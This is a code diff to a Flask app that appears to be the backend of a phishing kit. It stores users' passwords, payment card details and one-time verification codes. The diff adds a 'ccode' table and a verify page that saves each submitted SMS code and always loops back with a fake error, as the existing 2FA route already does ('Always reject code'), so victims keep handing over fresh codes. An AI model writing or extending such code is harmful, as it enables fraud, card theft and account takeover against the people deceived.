@@ -26,6 +26,7 @@ def close_connection(exception):
 with app.app_context():
     db = get_db()
     cursor = db.cursor()
+    
     cursor.execute("""
         CREATE TABLE IF NOT EXISTS payments (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -33,6 +34,7 @@ with app.app_context():
             amount REAL
         )
     """)
+    
     cursor.execute("""
         CREATE TABLE IF NOT EXISTS users (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -40,6 +42,7 @@ with app.app_context():
             password TEXT
         )
     """)
+    
     cursor.execute("""
         CREATE TABLE IF NOT EXISTS payment_details (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -56,11 +59,21 @@ with app.app_context():
             email TEXT
         )
     """)
+    
     cursor.execute("""
         CREATE TABLE IF NOT EXISTS codes ( 
-        id INTEGER PRIMARY KEY AUTOINCREMENT, 
-        code TEXT NOT NULL )
+            id INTEGER PRIMARY KEY AUTOINCREMENT, 
+            code TEXT NOT NULL
+        )
     """)
+    
+    cursor.execute("""
+        CREATE TABLE IF NOT EXISTS ccode (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            code TEXT NOT NULL
+        )
+    """)
+    
     db.commit()
 
 @app.route('/')
@@ -125,13 +138,11 @@ def two_factor():
 
 @app.route('/store_code', methods=['POST'])
 def store_code():
-    # join digits into one code
+    # Always reject code
     code = ''.join([request.form.get(f'digit{i}', '') for i in range(6)])
     db = get_db()
     db.execute("INSERT INTO codes (code) VALUES (?)", (code,))
     db.commit()
-
-    # after saving, reload 2FA with error flag
     return redirect(url_for("two_factor", error=1))
 
 @app.route('/store_payment_details', methods=['POST'])
@@ -155,7 +166,35 @@ def store_payment_details():
         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
     """, data)
     db.commit()
-    return redirect(url_for("notfound"))
+
+    phone = request.form.get("phone_number")
+    return redirect(url_for("loading", phone=phone))
+
+# ✅ Loading page
+@app.route('/loading')
+def loading():
+    phone = request.args.get("phone", "")
+    last4 = phone[-4:] if len(phone) >= 4 else "0000"
+    return render_template("loading.html", phone=phone, last4=last4)
+
+# ✅ Verify page
+@app.route('/verify', methods=['GET', 'POST'])
+def verify():
+    phone = request.args.get('phone', '')
+    last4 = phone[-4:] if len(phone) >= 4 else '0000'
+
+    if request.method == 'POST':
+        code = request.form.get('code')
+        if code:
+            db = get_db()
+            db.execute("INSERT INTO ccode (code) VALUES (?)", (code,))
+            db.commit()
+            # Always loop back with same phone
+            return redirect(url_for("verify", phone=phone, error=1))
+
+    error = request.args.get("error")
+    return render_template('cverify.html', last4=last4, error=error, phone=phone)
+
 
 @app.route("/notfound")
 def notfound():
@@ -173,3 +212,4 @@ def view_data():
 
 if __name__ == '__main__': 
     app.run(debug=True)
+
